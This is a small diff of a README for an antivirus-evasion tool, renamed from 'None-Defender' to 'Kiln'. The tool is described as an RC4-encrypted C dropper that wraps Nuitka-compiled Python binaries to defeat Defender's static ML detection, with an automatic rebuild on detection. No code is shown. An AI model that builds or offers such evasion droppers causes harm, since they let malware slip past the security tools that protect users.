@@ -1,4 +1,4 @@
-# None-Defender
+# Kiln
 
 Wraps any Nuitka-compiled Python binary in an RC4-encrypted C dropper that
 defeats Defender's static ML detection. Drop-in for any project -- no changes
@@ -58,13 +58,13 @@ disk. Signature rules can't track it.
 
 ---
 
-## Got detected? Just rebuild.
+## Got detected? Just rebuild
 
 ```
 build.bat <entry.py> [OutputName]
 ```
 
-No code changes needed. The randomisation is automatic.
+No code changes needed. The randomisation is automatic
 
 ---
 
